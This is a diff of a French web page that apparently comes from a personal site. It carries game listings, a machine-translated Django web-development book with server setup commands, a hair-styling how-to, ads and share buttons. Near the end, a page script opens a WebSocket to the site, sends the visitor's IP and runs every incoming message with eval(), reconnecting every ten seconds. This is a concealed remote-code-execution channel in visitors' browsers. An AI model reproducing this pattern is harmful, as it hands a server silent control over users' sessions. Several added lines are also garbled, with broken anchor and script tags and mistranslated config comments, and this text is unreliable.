@@ -140,11 +140,12 @@
 
 
 <div id="0" style="white-space: pre-wrap;">Trois treize - jeu de cartes en ligne
-Jouez à trois treize avec un ami en cliquant sur le lien ci-dessous pour générer un code d'invitation ou rejoindre un jeu.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">Inviter avec le code</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Se joindre à la partie</a>
-<script src="/static/games/threethirteen.js"></script>***</div>
+Jouez à trois treize avec un ami en cliquant sur le lien ci-dessous pour générer un code d'invitation ou rejoindre un jeu.<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">Inviter avec le code</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">Lotteh.com/games/</a>"title =" rejoindre un jeu "&gt; Rejoignez le jeu
+<script src="/static/games/threethirteen.js"></script>
+</div>
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="Acheter"/><p>par Daisy / <a href="/fr/three-thirteen---online-card" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="Acheter"/><p>par Daisy / <a href="/fr/three-thirteen---online-card" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -163,7 +164,17 @@ Jouez à trois treize avec un ami en cliquant sur le lien ci-dessous pour géné
 
 <hr></div>
 
-<div id="1" style="white-space: pre-wrap;">Apprentissage et sécurité en profondeur basée sur le Web par exemple
+<div id="1" style="white-space: pre-wrap;">Jouer à Color Sudoku en ligne - jeu Colordoku gratuit
+Ceci est un jeu gratuit de Color Sudoku (Colordoku).<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>par Daisy / <a href="/fr/play-color-sudoku-online---free" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">Apprentissage et sécurité en profondeur basée sur le Web par exemple
 Troisième édition
 Charlotte Harper
 3 juillet 2024
@@ -606,7 +617,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>C'est tout ce dont nous avons besoin pour enregistrer un utilisateur, mais nous devons avoir plus d'informations. Nous voulons connaître l'heure à laquelle l'utilisateur s'est inscrit, à quelle heure il était le dernier sur le site, quelques informations à leur sujet, comme une biographie, un fuseau horaire, etc. De plus, nous devrons mettre à jour notre modèle de flux, publier, pour tenir compte de l'utilisateur Modèle et attribut des publications à chaque utilisateur. Pour ce faire, nous mettrons à jour les modèles.py dans les deux applications. Commençons par modifier le modèle de flux. Cela devrait ressembler à ça maintenant:<pre class="language-python"><code>
-from django.db import models # … Des quantités
+from django.db import models # … Importations
 from django.contrib.auth.models import User
 
 class Post(models.Model):
@@ -980,7 +991,7 @@ def sendwelcomeemail(user):
 Alors, quelle est la prochaine étape? Nous avons parcouru un long chemin. Vraiment, nous devrions être prêts à déployer le site sur un serveur. Nous pouvons ajouter le décorateur @login_requered et rendre nos vues sécurisées, prendre des inscriptions des utilisateurs, envoyer des e-mails conformes et le cache, ce qui est la base de ce qu'un site Web doit faire pour rester pertinent. Nous allons ajouter quelques fonctionnalités plus utiles, puis créer une base pour déployer notre code sur un serveur distant, configurer un serveur de messagerie, une configuration de domaine et des filtres pour rendre notre site sécurisé et approprié.
 
 Nous aurons également besoin d'une vue de réinitialisation de mot de passe, alors ajoutons cela très rapidement. La vue de réinitialisation du mot de passe intégrée de Django est rompue dans certaines fonctions, mais nous examinerons comment rédiger notre propre vue, modèle de messagerie, formulaires et modèles d'URL. Voici à quoi ressemble la vue, dans les utilisateurs / vues.py<pre class="language-python"><code>
-# ... montants
+# ... importations
 from django.contrib.auth.tokens import default_token_generator
 from django.contrib.auth.forms import SetPasswordForm
 from django.utils.http import urlsafe_base64_decode
@@ -1503,7 +1514,7 @@ $('input').change(function(){
  </code></pre>Vous remarquerez qu'il s'agit d'une forme assez simple, mais il y a un peu de javascript qui publie automatiquement le contenu du formulaire lorsqu'ils sont mis à jour. Ceci est utile à avoir, vous pouvez donc effectuer des modifications sans avoir à appuyer sur Soumettre à chaque fois.
 
 Ensuite, nous avons besoin d'URL représentant toutes ces vues dans les motifs URL des utilisateurs. Modifier les utilisateurs / urls.py et ajouter ce code:<pre class="language-python"><code>
-# … Code précédent, importations
+#  … previous code, imports
 from django.urls import path
 from . import views
 
@@ -1641,7 +1652,7 @@ class MFAToken(models.Model):
 </code></pre>Ajoutons également un privilège à notre utilisateur, et nous le définirons manuellement pour l'instant, avant de migrer finalement vers les utilisateurs privilégiés automatiquement. Dans les modèles d'utilisateurs, ajoutez cette ligne dans le profil:<pre class="language-python"><code>
     vendor = models.BooleanField(default=False)
 </code></pre>Comme pour toute modification de la base de données, nous devons faire des migrations et migrer la base de données chaque fois que nous modifions un fichier Models.py dans Django. N'oubliez pas, pour ce faire, nous utilisons d'abord Source (s'il n'a pas déjà été utilisé depuis l'ouverture du terminal), puis Python Manage.py pour faire les migrations et migrer.<pre class="language-bash"><code>
-cd project-directory-you-named # (si nécessaire)
+cd project-directory-you-named # (Si nécessaire)
 source venv/bin/activate
 python manage.py makemigrations &amp;&amp; python manage.py migrate
 </code></pre>Pour l'instant, vous pouvez enrôler les comptes que vous avez créés en tant que fournisseurs en utilisant le shell.<pre class="language-bash"><code>
@@ -1868,7 +1879,7 @@ Notez que c'est beaucoup de Jinja, vous ne pouvez peut-être pas toutes ces vari
       &lt;a href="{{ user|document_front }}" class="btn btn-sm btn-outline-primary" title="ID front"&gt;&lt;i class="bi bi-person-badge-fill"&gt;&lt;/i&gt; ID front&lt;/a&gt;
       &lt;a href="{{ user|document_back }}" class="btn btn-sm btn-outline-primary" title="ID back"&gt;&lt;i class="bi bi-upc-scan"&gt;&lt;/i&gt; ID back&lt;/a&gt;
       {% endif %}
-      &lt;small&gt;# {{user.id}} &lt;/small&gt;
+      &lt;small&gt;# {{User.id}} &lt;/small&gt;
       &lt;small&gt;{% if user.profile.subscribed %}Subscribed{% else %}Not subscribed{% endif %}&lt;/small&gt;
     &lt;/div&gt;
     {%if not user.is_superuser %}
@@ -2167,7 +2178,7 @@ sudo NEEDRESTART_MODE=a DEBIAN_FRONTEND=noninteractive apt install -y postfix
 sudo NEEDRESTART_MODE=a apt install -y rkhunter clamav-daemon libx264-dev ffmpeg libapache2-mod-wsgi-py3 apache2 cmake python-is-python3 python3-venv python3-pip python3-django expect tesseract-ocr openjdk-8-jdk redis-server libopencv-dev python3-opencv python3-dev libsasl2-dev opendkim opendkim-tools dovecot-core dovecot-pop3d dovecot-imapd auditd procmail libpq-dev postgresql postgresql-contrib libheif-dev snapd git software-properties-common certbot python3-certbot-apache
 echo "-a exit,always -F arch=b64 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
 echo "-a exit,always -F arch=b32 -F euid=0 -S execve" | sudo tee -a /etc/audit/audit.rules
-#  Enable ClamAV antivirus
+# Activer Clamav Antivirus
 echo "Starting antivirus"
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
@@ -2650,7 +2661,7 @@ echo "Enabling services"
 sudo systemctl daemon-reload
 sudo systemctl enable clamav-daemon
 sudo systemctl start clamav-daemon
-#  Enable apache modules
+# Activer les modules Apache
 echo "Enabling apache2"
 sudo a2enmod rewrite
 sudo a2enmod wsgi
@@ -2920,7 +2931,7 @@ nano config/etc_postfix_master.cf
 # ==============================================. =======================.
 smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 PostScreen
-# Smtpd pass - - y - - smtpd
+# smtpd pass - - y - - smtpd
 # Dnsblog unix - - y - 0 dnsblog
 # Tlsproxy unix - - y - 0 tlSproxy
 # Choisissez-en un: activez uniquement la soumission pour les clients de bouclage ou pour tout client.
@@ -2948,7 +2959,7 @@ submission inet n       -       y       -       -       smtpd
 # Choisissez-en un: activez uniquement SMTPS pour les clients de Loopback, ou pour tout client.
 # 127.0.0.1:SMTPS INET N - Y - - SMTPD
 # Smtps inet n - y - - smtpd
-# -O syslog_name = postfix / smtps
+# -o syslog_name = postfix / smtps
 # -o smtpd_tls_wappermode = oui
 # -o smtpd_sasl_auth_enable = oui
 # -o smtpd_reject_unlistted_recipient = non
@@ -3011,7 +3022,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # 
 # Spécifiez dans main.cf un ou plusieurs des éléments suivants:
 # Mailbox_Transport = LMTP: INET: LocalHost
-# virtual_transport = lmtp: inet: localhost
+# Virtual_transport = lmtp: inet: localhost
 # 
 # ==============================================. ==================.
 # 
@@ -3019,7 +3030,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # Spécifiez également dans main.cf: cyrus_destination_recipent_limit = 1
 # 
 # cyrus     unix  -       n       n       -       -       pipe
-# Flags = drx user = cyrus argv = / cyrus / bin / délivre -e -r $ {expéditeur} -m $ {extension} $ {user}
+# Flags = DRX User = Cyrus Arg = / Cyrus / bin / Deliver -e -r $ {Sender} -M $ {Extension} $ {user}
 # 
 # ==============================================. ==================.
 # Ancien exemple de livraison via Cyrus.
@@ -3113,10 +3124,10 @@ service imap-login {
   # service_count = 1
 
   # Nombre de processus pour toujours attendre plus de connexions.
-  # process_min_avail = 0
+  # Process_min_avail = 0
 
   # Si vous définissez Service_Count = 0, vous devez probablement augmenter cela.
-  # Vsz_limi = $ default_vsz_limit
+  # vsz_limit = $ default_vsz_limit
 }
 
 service pop3-login {
@@ -3152,7 +3163,7 @@ service lmtp {
 
 service imap {
   # La plupart de la mémoire va aux fichiers mmap () ing. Vous devrez peut-être augmenter cela
-  #  limit if you have huge mailboxes.
+  # Limitez si vous avez d'énormes boîtes aux lettres.
   # vsz_limit = $ default_vsz_limit
 
   # Max. Nombre de processus IMAP (connexions)
@@ -3194,7 +3205,7 @@ service auth-worker {
   # Le processus de travailleur AUTH est exécuté par défaut de racine, afin qu'il puisse accéder
   # / etc / ombre. Si ce n'est pas nécessaire, l'utilisateur doit être modifié en
   # $ default_interal_user.
-  # Utilisateur = racine
+  # utilisateur = racine
 }
 
 service dict {
@@ -3269,7 +3280,7 @@ nano config/etc_dovecot_dovecot
 # Afficher plus de titres de processus verbeux (en PS). Affiche actuellement le nom d'utilisateur et
 # Adresse IP. Utile pour voir qui utilise réellement les processus IMAP
 # (par exemple, les boîtes aux lettres partagées ou si le même UID est utilisé pour plusieurs comptes).
-# Verbose_proctle = bien
+# verbose_proctitle = non
 
 # Si tous les processus sont tués lorsque le processus de maître Dovecot s'arrête.
 # Définir ceci sur "non" signifie que Dovecot peut être mis à niveau sans
@@ -3354,7 +3365,7 @@ OversignHeaders		From
 # Des options de configuration peuvent être trouvées dans /usr/share/doc/opendkim/readme.opendkim.
 # Domain			example.com
 # Sélecteur 2020
-# KeyFile /etc/dkimkeys/example.private
+# KeyFile		/etc/dkimkeys/example.private
 
 # Dans Debian, OpenDKIM s'exécute en tant qu'utilisateur "OpenDKIM". Un umask de 007 est requis lorsque
 # Utilisation d'une prise locale avec des MTA qui accèdent à la prise comme un non-privilégié
@@ -3406,7 +3417,7 @@ nano config/etc_default_opendkim
 # Daemon_opts = ""
 # Passer à / var / spool / postfix / run / opendendkim pour utiliser une prise Unix avec
 # Postfix dans un chroot:
-# Rundir = / var / spool / postfix / run / opendendkim
+# Rundir = / was / spool / postfix / run / opendendkim
 RUNDIR=/run/opendkim
 # 
 # Décommente pour spécifier une alternative
@@ -3580,23 +3591,14 @@ Merci d'avoir pris le temps de lire ce guide de développement Web de la troisi�
 <div><p>par Daisy / <a href="/fr/practical-web-based-deep" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">Couleur de deux joueurs sudoku en ligne gratuitement
+<div id="3" style="white-space: pre-wrap;">Couleur de deux joueurs sudoku en ligne gratuitement
 Jouez gratuitement à la couleur collaborative avec un ami.<a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">Inviter un ami</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Rejoindre un jeu</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="Acheter"/><p>par Daisy / <a href="/fr/two-player-color-sudoku-online" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">Jouer à Color Sudoku en ligne - jeu Colordoku gratuit
-Ceci est un jeu gratuit de Color Sudoku (Colordoku).
-***<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>par Daisy / <a href="/fr/play-color-sudoku-online---free" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="Acheter"/><p>par Daisy / <a href="/fr/two-player-color-sudoku-online" title="Voir le message">Voir</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="Acheter Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="Acheter avec la crypto-monnaie sur Lotte Harper">Acheter avec la crypto-monnaie</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>Comment porter une impasse?</p><p><br/></p><p>1. Commencez par laisser pousser vos cheveux à la longueur souhaitée. Vos cheveux doivent mesurer au moins 2 à 3 pouces de long pour de meilleurs résultats.</p><p><br/></p><p>2. Coupez vos cheveux en petites pièces à l'aide d'un peigne. La taille des sections déterminera la taille de vos dreadlocks, alors assurez-vous de choisir une taille avec laquelle vous êtes à l'aise.</p><p><br/></p><p>3. Commencez en arrière à chaque section de cheveux en les tournant et en les tirant étroitement vers les racines. Cela créera des nœuds dans les cheveux, qui finiront par se former en dreadlocks.</p><p><br/></p><p>4. Appliquez de la cire ou du gel sur chaque section de cheveux pour aider à maintenir les nœuds en place et à encourager les cheveux à se taper ensemble.</p><p><br/></p><p>5. Continuez à rétablir et à tordonner chaque section de cheveux jusqu'à ce que vous ayez terminé toute votre tête. Ce processus peut prendre du temps, alors soyez patient et faites des pauses au besoin.</p><p><br/></p><p>6. Une fois que tous vos cheveux ont été tordus et en arrière, laissez-le reposer pendant quelques jours pour permettre aux nœuds de se resserrer et de se former en dreadlocks.</p><p><br/></p><p>7. Après quelques jours, vous pouvez commencer à coiffer et entretenir vos dreadlocks en les lavant avec un shampooing sans résidus et en utilisant un crochet pour aider à resserrer les nœuds lâches.</p><p><br/></p><p>8. Pour garder vos dreadlocks soignés et bien rangés, pensez à utiliser un foulard ou un bandana pour les couvrir lorsque vous dormez ou dans des environnements sales. L'entretien et l'entretien réguliers aideront vos dreadlocks à rester en bonne santé et dynamiques.</p></div>
@@ -3777,9 +3779,9 @@ Ceci est un jeu gratuit de Color Sudoku (Colordoku).
 </div>
 <div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
 <div class="mb-2" style="display: flex; justify-content: space-around;">
-<a title="Partager sur Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Ffr%2Fnews%3F&quote=Visit%20this%20link%20on%20Glam%20Girl%20X&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
+<a title="Partager sur Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Ffr%2Fnews%3F&quote=Three%20Thirteen%20-%20Online%20Card%20Game&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
   <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
-<a title="Partager sur Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Visit%20this%20link%20on%20Glam%20Girl%20X%20-&url=https://glamgirlx.com/fr/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
+<a title="Partager sur Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Three%20Thirteen%20-%20Online%20Card%20Game%20-&url=https://glamgirlx.com/fr/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
   <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
 </svg></a>
 <a title="Partager sur Pinterest" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/fr/news?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
@@ -3791,7 +3793,7 @@ Ceci est un jeu gratuit de Color Sudoku (Colordoku).
 </div>
 <div class="mb-2" style="display: flex; justify-content: space-around;">
 <a title="Partager sur Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/fr/news?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></img></a>
-<a title="Partager sur Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/fr/news?&title=Visit%20this%20link%20on%20Glam%20Girl%20X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
+<a title="Partager sur Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/fr/news?&title=Three%20Thirteen%20-%20Online%20Card%20Game"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
   <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
   <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
 </svg></a>
@@ -3893,32 +3895,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
